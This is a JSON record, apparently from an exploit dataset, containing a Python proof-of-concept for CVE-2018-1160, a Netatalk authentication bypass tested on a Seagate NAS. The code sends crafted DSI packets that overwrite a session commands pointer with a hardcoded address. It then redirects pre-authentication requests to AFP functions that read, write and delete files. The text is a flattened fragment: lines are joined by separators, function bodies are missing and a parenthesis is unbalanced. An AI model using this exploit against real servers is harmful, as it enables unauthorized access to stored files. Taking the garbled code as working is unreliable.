{
    "text": "vul_name : Netatalk Authentication Bypass ， vul_cve : CVE-2018-1160 ， vul_poc :  ，  # Exploit Title : Netatalk Authentication Bypass ，  # Date : 12/20/2018 ，  # Exploit Author : Jacob Baines ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : Before 3.1.12 ，  # Tested on : Seagate NAS OS ( x86_64 )  ，  # CVE : CVE-2018-1160 ，  # Advisory :  ，  # Known addresses :  ，  # This exploit was written against a Netatalk compiled for an ，  # x86_64 Seagate NAS. The addresses below will need to be changed ，  # for a different target. ， preauth_switch_base = '\\x60\\xb6\\x63\\x00\\x00\\x00\\x00\\x00' # 0x63b6a0 ， afp_getsrvrparms = '\\x60\\xb6\\x42\\x00\\x00\\x00\\x00\\x00' # 0x42b660 ， afp_openvol = '\\xb0\\xb8\\x42\\x00\\x00\\x00\\x00\\x00' # 42b8b0 ， afp_enumerate_ext2 = '\\x90\\x97\\x41\\x00\\x00\\x00\\x00\\x00' # 419790 ， afp_openfork = '\\xd0\\x29\\x42\\x00\\x00\\x00\\x00\\x00' # 4229d0 ， afp_read_ext = '\\x30\\x3a\\x42\\x00\\x00\\x00\\x00\\x00' # 423a30 ， afp_createfile = '\\x10\\xcf\\x41\\x00\\x00\\x00\\x00\\x00' # 41cf10 ， afp_write_ext = '\\xb0\\x3f\\x42\\x00\\x00\\x00\\x00\\x00' # 423fb0 ， afp_delete = '\\x20\\x06\\x42\\x00\\x00\\x00\\x00\\x00' # 420620 ，  # This is the actual exploit. Overwrites the commands pointer ，  # with the base of the preauth_switch ， print \" [ + ] Sending exploit to overwrite preauth_switch data.\" ， data = '\\x00\\x04\\x00\\x01\\x00\\x00\\x00\\x00' ， data += '\\x00\\x00\\x00\\x1a\\x00\\x00\\x00\\x00' ， data += '\\x01' # attnquant in open sess ， data += '\\x18' # attnquant size ， data += '\\xad\\xaa\\xaa\\xba' # overwrites attn_quantum ( on purpose )  ， data += '\\xef\\xbe\\xad\\xde' # overwrites datasize ， data += '\\xfe\\xca\\x1d\\xc0' # overwrites server_quantum ， data += '\\xce\\xfa\\xed\\xfe' # overwrites the server id and client id ， data += preauth_switch_base # overwrite the commands ptr ， sock.sendall ( data )  ，  # don't really care about the respone ， resp = sock.recv ( 1024 )  ，  # Sends a request to the server. ，  #  @ param socket the socket we are writing on ，  #  @ param request_id two bytes. requests are tracked through the session ，  #  @ param address the address that we want to jump to ，  #  @ param param_string the params that the address will need ， data = '\\x00' # flags ， data += '\\x02' # command ， data += request_id ， data += '\\x00\\x00\\x00\\x00' # data offset ， data += '\\x00\\x00\\x00\\x90' # cmd length <= always the same ， data += '\\x00\\x00\\x00\\x00' # reserved ，  # = below gets copied into dsi->cmd = ， data += '\\x11' # use the 25th entry in the pre_auth table. We'll write the function to execute there ， data += '\\x00' # pad ， data += ( \"\\x00\" * 134 )  ， data += param_string ， data += ( \"\\x00\" *  ( 134 - len ( param_string )  ， data += address # we'll jump to this address ， sock.sendall ( data )  ，  # Parses the DSI header. If we don't get the expected request id ，  # then we bail out. ，  ( flags , command , req_id , error_code , length , reserved ) = struct.unpack_from ( '>BBHIII' , payload )  ， print ' [ - ] Bad DSI Header : %u %u %u' % ( flags , command , req_id )  ， sys.exit ( 0 ) ",
    "time": "2018.12.23"
}